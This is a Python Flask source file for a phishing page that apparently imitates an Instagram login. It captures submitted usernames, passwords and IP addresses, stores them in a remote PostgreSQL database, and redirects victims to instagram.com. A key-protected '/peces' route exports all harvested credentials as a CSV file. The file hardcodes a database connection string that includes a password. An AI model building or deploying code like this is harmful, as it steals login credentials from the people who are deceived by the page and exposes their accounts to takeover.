from flask import Flask, request, render_template, redirect, Response, abort
from datetime import datetime
import psycopg2
import csv
import io
import os

app = Flask(__name__)


DATABASE_URL = "postgresql://cred_z1z9_user:uwXeYXEVd6cLvyH7OsUeKXIzrFI2Y54R@dpg-d0un21be5dus739p6070-a.oregon-postgres.render.com:5432/cred_z1z9"

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip = request.remote_addr
        time = datetime.now()

        try:
            conn = psycopg2.connect(DATABASE_URL)
            cur = conn.cursor()

            cur.execute("""
                CREATE TABLE IF NOT EXISTS credenciales (
                    id SERIAL PRIMARY KEY,
                    username TEXT,
                    password TEXT,
                    ip TEXT,
                    fecha TIMESTAMP
                )
            """)

            cur.execute("""
                INSERT INTO credenciales (username, password, ip, fecha)
                VALUES (%s, %s, %s, %s)
            """, (username, password, ip, time))

            conn.commit()
            cur.close()
            conn.close()

            print(f"[GUARDADO] {username} - {password} - {ip} - {time}")

        except Exception as e:
            print("[ERROR AL GUARDAR EN BD]", e)

        return redirect("https://www.instagram.com")

    return render_template("form.html")
    from flask import Response

@app.route('/peces')
def descargar_csv():
    clave = request.args.get('clave')

    if clave != 'Badc41lluPass%':
        return abort(403, description="Acceso denegado")

    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()

        cur.execute("SELECT id, username, password, ip, fecha FROM credenciales")
        datos = cur.fetchall()

        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['ID', 'Usuario', 'Contraseña', 'IP', 'Fecha'])
        writer.writerows(datos)

        cur.close()
        conn.close()

        return Response(
            output.getvalue(),
            mimetype='text/csv',
            headers={"Content-Disposition": "attachment;filename=credenciales.csv"}
        )
    except Exception as e:
        return f"Error al exportar datos: {e}", 500


if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))  # Render usa una variable de entorno PORT
    app.run(host='0.0.0.0', port=port)

